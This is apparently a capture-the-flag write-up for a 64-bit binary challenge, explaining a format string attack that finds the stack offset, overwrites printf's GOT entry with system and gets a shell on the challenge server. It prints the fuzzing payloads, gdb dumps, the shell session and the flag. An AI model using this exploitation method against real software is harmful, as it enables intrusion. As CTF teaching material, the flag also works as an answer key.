# Printf Polyglot
Binary

## Challenge 

Written by nthistle

Security Consultants Inc. just developed a new portal! We managed to get a hold of the source code, and it doesn't look like their developers know what they're doing.

nc p1.tjctf.org 8003

## Solution

We have a 64-bit executable. Look at the source code and the user input is directly placed into printf(), thus it is vulnerable to format string attack

	printf("I have your email as:\n");
	printf(email);

From here we see that there is also a segfault placed in on purpose. This means that no ROP is possible and we need to execute the format string such that it can spawn a shell here.

	void newsletter() {
	   printf("Thanks for signing up for our newsletter!\n");
	   printf("Please enter your email address below:\n");
	   
	   char email[256];
	   fgets(email, sizeof email, stdin);
	   printf("I have your email as:\n");
	   printf(email);
	   printf("Is this correct? [Y/n] ");
	   char confirm[128];
	   fgets(confirm, sizeof confirm, stdin);
	   if (confirm[0] == 'Y' || confirm[0] == 'y' || confirm[0] == '\n') {
	      printf("Great! I have your information down as:\n");
	      printf("Name: Evan Shi\n");
	      printf("Email: ");
	      printf(email);
	   } else {
	      printf("Oops! Please enter it again for us.\n");
	   }
	   
	   int segfault = *(int*)0;
	   // TODO: finish this method, for now just segfault,
	   // we don't want anybody to abuse this
	}

If you notice, printf() is called twice. If we were to overwrite the GOT entry of printf() with system(), we will be able to have this...


	fgets(email, sizeof email, stdin);
	printf("I have your email as:\n");
	printf(email);

	// after overwriting printf->system
	if (confirm[0] == 'Y' || confirm[0] == 'y' || confirm[0] == '\n') {
	  system("Great! I have your information down as:\n");
	  system("Name: Evan Shi\n");
	  system("Email: ");
	  system(email);

Hence, we can place a 'sh;#' string in the buffer and execute a format string attack to overwrite the GOT entry.

### Find buffer offset

Fuzz for the offset using this payload

	ABCD1234 1(%016lx) 2(%016lx) 3(%016lx) 4(%016lx) 5(%016lx) 6(%016lx) 7(%016lx) 8(%016lx) 9(%016lx) 10(%016lx) 11(%016lx) 12(%016lx) 13(%016lx) 14(%016lx) 15(%016lx) 16(%016lx) 17(%016lx) 18(%016lx) 19(%016lx) 20(%016lx) 21(%016lx) 22(%016lx) 23(%016lx) 24(%016lx) 25(%016lx) 26(%016lx) 27(%016lx) 28(%016lx) 29(%016lx) 30(%016lx) 31(%016lx) 32(%016lx) 33(%016lx) 34(%016lx) 35(%016lx) 36(%016lx) 37(%016lx) 38(%016lx) 39(%016lx) 40(%016lx)

From here we see the offset is at 24 where we see the start of the buffer `24(4847464544434241)`.

	# nc p1.tjctf.org 8003
	Welcome to the brand new Security Consultants Inc. portal!
	What would you like to do?
	1.) View the Team!
	2.) Check the date.
	3.) Sign up for our newsletter!
	4.) Report a bug.
	x.) Exit.
	3
	Thanks for signing up for our newsletter!
	Please enter your email address below:
	ABCDEFGH 1(%lx) 2(%lx) 3(%lx) 4(%lx) 5(%lx) 6(%lx) 7(%lx) 8(%lx) 9(%lx) 10(%lx) 11(%lx) 12(%lx) 13(%lx) 14(%lx) 15(%lx) 16(%lx) 17(%lx) 18(%lx) 19(%lx) 20(%lx) 21(%lx) 22(%lx) 23(%lx) 24(%lx) 25(%lx) 26(%lx) 27(%lx) 28(%lx) 29(%lx) 30(%lx) 31(%lx) 32(%lx) 33(%lx) 34(%lx) 35(%lx) 36(%lx) 37(%lx) 38(%lx) 39(%lx) 40(%lx)

	I have your email as:
	ABCDEFGH 1(7f4ddaef37e3) 2(7f4ddaef48c0) 3(7f4ddac17154) 4(15) 5(7f4ddaef48d0) 6(1000) 7(7f4ddab851aa) 8(9) 9(6a702f) 10(1) 11(c1ff) 12(0) 13(0) 14(0) 15(1000) 16(0) 17(0) 18(0) 19(0) 20(0) 21(0) 22(0) 23(0) 24(4847464544434241) 25(2029786c25283120) 26(332029786c252832) 27(28342029786c2528) 28(2528352029786c25) 29(6c2528362029786c) 30(786c252837202978) 31(29786c2528382029) 32(2029786c25283920)Is this correct? [Y/n] Oops! Please enter it again for us.

We can test it

	 $ nc p1.tjctf.org 8003
	Please enter your email address below:
	ABCD %24$08x        
	I have your email as:
	ABCD 44434241

Now, we need to place an address we want to write to in the buffer. Using the offset found, we can use format string to select it and write to it using `%n` or by selecting the offset at `%24$n`.

---

### ELF Addresses


##### PLT table addresses

From disassembly

	j_printf:    // printf@plt
	00000000004006f0  jmp qword [printf@GOT]  

	j_system:    // system@plt
	00000000004006e0  jmp qword [system@GOT] 

##### GOT table addresses

From disassembly

	system@GOT:        // system
	0000000000602040         dq         0x0000000000603028
	printf@GOT:        // printf
	0000000000602048         dq         0x0000000000603030    

Alternatively, use objdump

	# objdump -R ./printf_polyglot 

	./printf_polyglot:     file format elf64-x86-64

	DYNAMIC RELOCATION RECORDS
	OFFSET           TYPE              VALUE 
	0000000000601ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5
	0000000000601ff8 R_X86_64_GLOB_DAT  __gmon_start__
	0000000000602080 R_X86_64_COPY     stdout@@GLIBC_2.2.5
	0000000000602090 R_X86_64_COPY     stdin@@GLIBC_2.2.5
	0000000000602018 R_X86_64_JUMP_SLOT  putchar@GLIBC_2.2.5
	0000000000602020 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
	0000000000602028 R_X86_64_JUMP_SLOT  __stack_chk_fail@GLIBC_2.4
	0000000000602030 R_X86_64_JUMP_SLOT  setresgid@GLIBC_2.2.5
	0000000000602038 R_X86_64_JUMP_SLOT  setbuf@GLIBC_2.2.5
	0000000000602040 R_X86_64_JUMP_SLOT  system@GLIBC_2.2.5
	0000000000602048 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
	0000000000602050 R_X86_64_JUMP_SLOT  fgets@GLIBC_2.2.5
	0000000000602058 R_X86_64_JUMP_SLOT  strcmp@GLIBC_2.2.5
	0000000000602060 R_X86_64_JUMP_SLOT  getegid@GLIBC_2.2.5

---

I did lots of trials and errors, which is difficult to explain. However, these are some snippets of my debugging process.

In GDB, we can see the GOT table entry.

Before overwriting

	(gdb) x/40x 0x0602040 
	0x602040:	0x004006e6	0x00000000	0x004006f6	0x00000000
	0x602050:	0xf7e79990	0x00007fff	0x00400716	0x00000000

After overwriting with 0x14

	(gdb) x/40x 0x0602040 
	0x602040:	0x004006e6	0x00000000	0x00000014	0x00007fff
	0x602050:	0xf7e79990	0x00007fff	0x00400716	0x00000000

Realise that `0x004006f6` was replaced with `0x00000014`. It was successfully written, but only 4 bytes: `0x00000014 0x00007fff`. Whereas in 64-bits we are dealing with 8 byte addresses.

To solve this replace `%28$n` with `%28$ln` to write 8 bytes

Try again overwriting with 0x14, using `%ln`.

	(gdb) x/40x 0x0602040 
	0x602040:	0x004006e6	0x00000000	0x00000014	0x00000000
	0x602050:	0xf7e79990	0x00007fff	0x00400716	0x00000000

---

More explanation of how I formed the payload is in my script.

> [format_string.py](format_string.py)

***I did not solve this within the CTF because this was the first time I did format string attack on a 64-bit binary. Take note that 64-bit addresses are 8 bytes long and may contain NULL bytes. Hence, the address must be placed only after all the payload is written***

Final exploit

	# (python format_string.py; cat) | nc p1.tjctf.org 8003

	Welcome to the brand new Security Consultants Inc. portal!
	What would you like to do?
	1.) View the Team!
	2.) Check the date.
	3.) Sign up for our newsletter!
	4.) Report a bug.
	x.) Exit.
	Thanks for signing up for our newsletter!
	Please enter your email address below:
	I have your email as:
	sh;# 

	Great! I have your information down as:
	Name: Evan Shi
	sh: 1: Email:: not found
	ls -la
	total 44
	dr-xr-xr-x 1 app  app   4096 Apr  5 16:03 .
	drwxr-xr-x 1 root root  4096 Apr  2 22:41 ..
	-r--r--r-- 1 app  app    220 Apr  4  2018 .bash_logout
	-r--r--r-- 1 app  app   3771 Apr  4  2018 .bashrc
	-r--r--r-- 1 app  app    807 Apr  4  2018 .profile
	-r-xr-xr-x 1 root root    33 Apr  2 22:22 flag.txt
	-r-xr-xr-x 1 root root 13072 Apr  5 16:03 printf_polyglot
	-r-xr-xr-x 1 root root    77 Apr  2 22:22 wrapper
	cat flag.txt
	tjctf{p0lygl0t_m0r3_l1k3_p0lynot}

References used for Format String Attack:

-https://samsclass.info/127/proj/p6-fs.htm
-https://www.pwndiary.com/write-ups/angstrom-ctf-2018-personal-letter-write-up-pwn160/
-https://nuc13us.wordpress.com/2015/09/04/format-string-exploit-overwrite-got/
-https://www.ret2rop.com/2018/10/format-strings-got-overwrite-remote.html
-https://github.com/zst123/picoctf-2018-writeups/tree/master/Solved/authenticate

## Flag

	tjctf{p0lygl0t_m0r3_l1k3_p0lynot}
